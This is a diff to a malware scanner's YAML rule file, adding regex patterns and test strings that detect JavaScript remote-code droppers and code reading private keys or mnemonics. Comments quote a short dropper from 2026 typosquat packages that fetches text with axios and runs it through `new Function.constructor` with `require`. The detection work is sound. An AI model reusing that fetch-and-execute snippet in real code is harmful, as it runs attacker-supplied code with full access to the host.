@@ -72,13 +72,28 @@ rules:
       kind: regex
       patterns:
         - '\beval\s*\('
-        - '\bnew\s+Function\s*\('
+        # `.constructor` between the name and the parenthesis, because
+        # `Function.constructor` IS `Function` -- every function's constructor
+        # is the `Function` constructor -- so `new Function.constructor(a, b)`
+        # compiles and runs exactly what `new Function(a, b)` does while
+        # matching neither the obvious pattern nor a reader's eye.
+        #
+        # `cookie-parseflow` 1.5.8 is built on it. Its `lib/initializeCaller.js`
+        # decodes a base64 URL with `atob`, GETs it with `axios`, and runs the
+        # response through `new Function.constructor("require", response)` --
+        # handing the fetched text the `require` function. Cordon reported
+        # nothing at all in that package: no execute primitive fired, so the
+        # decode and the fetch had nothing to combine with. The same shape
+        # appears across the `chai-*` and `cookie-*` typosquats of 2026.
+        - '\bnew\s+Function\s*(?:\.\s*constructor\s*)?\('
+        - '\bFunction\s*\.\s*constructor\s*\('
         - '\bvm\s*\.\s*run(?:InNewContext|InThisContext|InContext)\s*\('
         - '\bsetTimeout\s*\(\s*["'']'
     tests:
       positive:
         - "eval(decoded);"
         - "const fn = new Function('a', 'return a');"
+        - "const handler = new Function.constructor('require', response);"
         - "vm.runInNewContext(src, sandbox);"
       negative:
         - "// eval is not used here"
@@ -405,6 +420,28 @@ rules:
       patterns:
         - '\beval\s{0,4}\(\s{0,4}(?:await\s{1,4})?(?:[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}){0,4}(?:fetch|get|request|axios)\b'
         - '\b(?:fetch|axios|https?\.get)\b[^;\n]{0,200}\.\s{0,4}then\s{0,4}\(\s{0,4}[^)\n]{0,60}=>\s{0,4}eval\s{0,4}\('
+        # And the `await` form, where the response lands in a variable first and
+        # the evaluator is the next statement but one. Same act, written the way
+        # anybody writes asynchronous code now:
+        #
+        #     const s = (await axios.get(src, { headers: { [k]: v } })).data.config;
+        #     const handler = new Function.constructor("require", s);
+        #     handler(require);
+        #
+        # That is `chai-smart-assert` 1.1.5, and `chai-chain-test`, and
+        # `chain-async-test`, and the rest of a family of typosquats published
+        # through 2026. Cordon reported nothing in any of them, and the reason
+        # was precise rather than accidental: `SUSPECT.DROPPER.001` requires a
+        # third signal beyond egress and execute, because `egress AND execute`
+        # on its own describes every deploy script ever written. The three
+        # signals it accepts are a decode, an install hook, or this primitive --
+        # and these packages have none of the first two. Their URL is in plain
+        # text, so nothing decodes, and the payload runs on `require`, not on
+        # install.
+        #
+        # Two hundred characters between the fetch and the evaluator, which is
+        # room for the two lines above and not much else.
+        - '\b(?:fetch|axios|https?\s{0,4}\.\s{0,4}get)\s{0,4}(?:\.\s{0,4}(?:get|post|request)\s{0,4})?\([^;]{0,200}[\s\S]{0,200}?\b(?:eval|new\s{1,4}Function\s{0,4}(?:\.\s{0,4}constructor\s{0,4})?)\s{0,4}\('
         # The same shape with a BLOCK body, and with `new Function` as well as
         # `eval`. The pattern above requires the evaluator to be the first thing
         # in the arrow, which only matches the one-expression form.
@@ -484,3 +521,41 @@ rules:
       negative:
         - "JSON.parse(text)"
         - "structuredClone(obj)"
+
+  - id: CAP.JS.KEYMATERIAL.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    # `wallet`, not `credential`. The existing wallet rule calls an address
+    # "a credential with a balance"; this is the other half of that pair, the
+    # part that spends it. Filing it as `credential` would light up every
+    # composite that pairs a credential with a network call, and a signing
+    # library reads key material and talks to an RPC endpoint for a living --
+    # which is exactly the false positive that put `saltstack/salt` at critical
+    # earlier in this release. `wallet` is named by one composite, gated on an
+    # install hook, so the blast radius of being wrong here is bounded.
+    capability: wallet
+    title: Reads private key material by name
+    message: >
+      This file reads a value named as a private key, a mnemonic or a recovery
+      phrase. That is the whole of the asset: unlike a password it cannot be
+      rotated, and unlike a session token it does not expire.
+    remediation: >
+      No action required for this signal alone. It matters next to a network
+      call, because key material that leaves the process is spent.
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        - '\b_?(?:secret|private)[_]?[Kk]ey\b'
+        - '\b(?:mnemonic|seedPhrase|seed_phrase|recoveryPhrase|recovery_phrase)\b'
+    tests:
+      positive:
+        - "const b = bs58.encode(this._secretKey);"
+        - "sign(msg, privateKey)"
+        - "const { mnemonic } = wallet;"
+      negative:
+        - "const pub = keypair.publicKey;"
+        - "// the private key never leaves the enclave"
+        - "import { Keypair } from '@solana/web3.js';"
